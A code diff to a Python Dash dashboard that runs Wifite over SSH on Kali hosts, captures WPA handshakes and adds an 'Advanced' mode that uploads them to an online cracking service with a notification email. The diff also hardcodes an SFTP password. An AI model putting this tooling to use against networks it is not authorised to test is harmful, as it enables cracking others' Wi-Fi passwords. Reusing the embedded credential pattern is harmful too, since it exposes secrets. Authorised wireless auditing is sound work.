@@ -25,6 +25,37 @@ import plotly.graph_objects as go
 import pdfcreation
 from dash.exceptions import PreventUpdate
 
+def AdvancedCrack(host: str, password: str, handshake, email):
+    host = host
+    port = 22
+    username = "kali"
+    password = password
+    handshake = handshake
+    email = email
+    #command = "ls /home/kali/hs  | grep "+essid+" | > /home/kali/Reports/"+essid+".handshake"
+    command = "wlancap2wpasec -u https://api.onlinehashcrack.com  -e "+email+" /home/kali/hs/"+handshake
+    ssh = paramiko.SSHClient()
+    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+    ssh.connect(host, port, username, password)
+    ssh.exec_command(command)
+    stdin, stdout, stderr = ssh.exec_command(command)
+    lines = stdout.readlines()
+    error = stderr.readlines()    
+    return lines
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 def Handshake(host: str, password: str, essid):
     host = host
     port = 22
@@ -323,6 +354,12 @@ app.layout = html.Div([
     html.Div(id='pandas-output-container-1', className='dark-theme-control'),
     html.Button('E.X.E.C.U.T.E WSS', id = 'submitButton3', n_clicks = 0),
     html.Div(id='pandas-output-container-2'),
+    html.H3("------------------------------------"),
+    html.H3("Only Advanced Mode: This email will receive the WPA2 Advanced Crack Online Status"),
+    dcc.Input(
+            id="input-email", type="email", placeholder="Enter the email will receive the WPA2 Advanced Crack Notification",disabled=True,
+            
+        ),
     dcc.Interval(
         id='dataUpateInterval', 
         interval=5*1000, 
@@ -341,6 +378,23 @@ app.layout = html.Div([
    #Input('dropdown-essid', 'options'),
     #Input('pandas-dropdown-1', 'value')
 #)
+@app.callback(Output('input-email', 'disabled'),
+[
+              Input('drop-multi', 'value'),
+              ]
+)
+def enable_input(DropMultiValue):
+    if DropMultiValue == ['WPA/WPA2 Advanced'] or DropMultiValue == ['WPA/WPA2 Basic Crack', 'WPA/WPA2 Advanced']:
+        return False
+    else:
+        return True
+
+
+
+
+
+
+
 @app.callback(Output('confirm-handshake', 'displayed'),
     Output('confirm-handshake', 'message'),[
               Input('submitButton3', 'n_clicks'),
@@ -400,9 +454,10 @@ def update_output(value):
          Input('submitButton3', 'n_clicks'),
           Input('dropdown-bssid', 'value'),
         Input('dropdown-essid', 'value'),
-        Input('drop-multi', 'value')]
+        Input('drop-multi', 'value'),
+        Input('input-email', 'value')]
 )
-def render_content(tab, callbackContext,DropDownDevvalue,callbackContext2,callbackContext3, bssid,essid,dropmultichoise):
+def render_content(tab, callbackContext,DropDownDevvalue,callbackContext2,callbackContext3, bssid,essid,dropmultichoise,email_input):
     # Instantiate the callback context, to find the button ID that triggered the callback
     callbackContext = callback_context
     callbackContext2 = callback_context
@@ -413,7 +468,7 @@ def render_content(tab, callbackContext,DropDownDevvalue,callbackContext2,callba
     button_id3 = callbackContext3.triggered[0]['prop_id'].split('.')[0]
     if button_id == 'submitButton'and tab == 'tab-3':
         if check_ping("100.64.0.2") == True and check_ping("100.64.0.4") == True:
-            toSSH("100.64.0.2", "kali", "wlan0mon")
+            toSSH("100.64.0.2", "kali", "wlan1mon")
             toSSH("100.64.0.4", "sifi2224", "wlan0mon")
             
         #if check_ping("100.64.0.77") == True:
@@ -463,6 +518,9 @@ def render_content(tab, callbackContext,DropDownDevvalue,callbackContext2,callba
             interface = "wlan1mon"
             directory = "/home/ittadmin/Reports/wifi_networks/100.64.0.2/wifi_last-01.csv"
         Wifite(DropDownDevvalue, passwordDev, bssid, interface)
+        handshake = Handshake(DropDownDevvalue, passwordDev, essid)
+        if dropmultichoise == ['WPA/WPA2 Basic Crack', 'WPA/WPA2 Advanced'] or dropmultichoise == ['WPA/WPA2 Advanced']:
+             advancedCrackOutput = AdvancedCrack(DropDownDevvalue, passwordDev, handshake, email_input)
         dfrawifi = read_csv_sftp("100.64.0.1", "ittadmin", directory, "L1br0Sh@rkR1ng")
         dframod = dfrawifi.loc[dfrawifi['BSSID'].isin([bssid])]
         return html.Div([ html.H3(
@@ -481,11 +539,17 @@ def render_content(tab, callbackContext,DropDownDevvalue,callbackContext2,callba
                           'backgroundColor': 'rgb(30, 30, 30)',
                             'color': 'white'
                         }),
-                        html.H3( Handshake(DropDownDevvalue, passwordDev, essid), style={
+                        html.H3( handshake, style={
                           'backgroundColor': 'rgb(30, 30, 30)',
                             'color': 'white'
                         }),
                         
+                         html.H3( advancedCrackOutput, style={
+                          'backgroundColor': 'rgb(30, 30, 30)',
+                            'color': 'white'
+                        })
+
+
                         ])
                         
         
